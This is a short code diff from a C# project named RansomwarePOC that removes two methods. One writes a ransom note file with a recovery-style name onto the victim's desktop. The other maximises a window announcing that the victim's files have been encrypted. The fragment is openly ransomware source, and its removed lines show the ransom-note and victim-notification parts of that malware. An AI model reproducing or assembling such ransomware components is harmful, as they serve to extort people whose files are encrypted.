@@ -73,21 +73,7 @@ namespace RansomwarePOC
                 Application.Exit();
             }
         }
-         private void dropRansomLetter()
-        {
-            StreamWriter ransomWriter = new StreamWriter(DESKTOP_FOLDER + @"\___RECOVER__FILES__" + ENCRYPTED_FILE_EXTENSION + ".txt");
-            //@ perdoret per me e mar stringun mas @ si literal
-            ransomWriter.WriteLine(RANSOM_LETTER);
-            ransomWriter.WriteLine(ENCRYPTION_LOG);
-            ransomWriter.Close();
-        }
-
-        private void formatFormPostEncryption()
-        {
-            this.Opacity = 100;
-            this.WindowState = FormWindowState.Maximized;
-            lblCount.Text = "Your files (count: " + encryptedFileCount + ") have been encrypted!";
-        }
+        
         private void initializeForm()
         {
             this.Opacity = 0;
